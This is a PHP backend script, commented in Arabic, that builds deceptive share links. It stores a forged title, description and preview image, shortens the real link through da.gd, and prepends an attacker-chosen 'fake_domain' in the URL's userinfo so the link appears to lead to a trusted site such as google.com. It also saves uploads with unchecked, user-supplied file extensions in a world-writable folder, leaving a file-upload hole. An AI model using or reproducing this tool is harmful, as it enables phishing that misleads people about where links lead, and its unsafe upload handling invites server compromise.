<?php
// إعدادات الملفات
$dbFile = 'db.json';
$uploadDir = 'uploads/';

// إنشاء المجلد والملف إذا لم يكونا موجودين
if (!file_exists($uploadDir)) mkdir($uploadDir, 0777, true);
if (!file_exists($dbFile)) file_put_contents($dbFile, json_encode([]));

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // 1. معالجة الصورة
    $finalImage = '';
    
    // إذا تم رفع ملف
    if (isset($_FILES['image_file']) && $_FILES['image_file']['error'] === 0) {
        $ext = pathinfo($_FILES['image_file']['name'], PATHINFO_EXTENSION);
        $filename = uniqid() . '.' . $ext;
        move_uploaded_file($_FILES['image_file']['tmp_name'], $uploadDir . $filename);
        
        // نحتاج الرابط الكامل للصورة ليظهر في فيسبوك
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
        $host = $_SERVER['HTTP_HOST'];
        $path = dirname($_SERVER['PHP_SELF']);
        $finalImage = "$protocol://$host$path/$uploadDir$filename";
    
    } else {
        // استخدام الرابط المباشر
        $finalImage = $_POST['image_url'] ?? '';
    }

    // 2. تجهيز البيانات
    $id = uniqid(); // معرف فريد للرابط
    $newData = [
        'id' => $id,
        'original_url' => $_POST['original_url'],
        'title' => $_POST['title'],
        'description' => $_POST['description'],
        'image' => $finalImage,
        'icon' => $_POST['icon_url'] ?? '',
        'created_at' => date('Y-m-d H:i:s')
    ];

    // 3. الحفظ في JSON
    $currentData = json_decode(file_get_contents($dbFile), true);
    $currentData[$id] = $newData;
    file_put_contents($dbFile, json_encode($currentData, JSON_PRETTY_PRINT));

    // 4. إنشاء رابط المعاينة المحلي
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
    $host = $_SERVER['HTTP_HOST'];
    $dir = dirname($_SERVER['PHP_SELF']);
    // هذا الرابط الذي سنقوم باختصاره
    $viewLink = "$protocol://$host$dir/view.php?id=$id";

    // 5. الاختصار باستخدام da.gd
    $shortService = "https://da.gd/s?url=" . urlencode($viewLink);
    $shortened = @file_get_contents($shortService);

    if ($shortened) {
        $shortened = trim($shortened);
        // إزالة البروتوكول لدمج الدومين الوهمي
        $cleanShort = str_replace(['https://', 'http://'], '', $shortened);
        $fakeDomain = trim($_POST['fake_domain']);
        
        // النتيجة النهائية: https://google.com@da.gd/xyz
        $finalLink = "https://$fakeDomain@$cleanShort";
        
        echo json_encode(['status' => 'success', 'short_link' => $finalLink]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'فشل الاتصال بخدمة الاختصار']);
    }
}
?>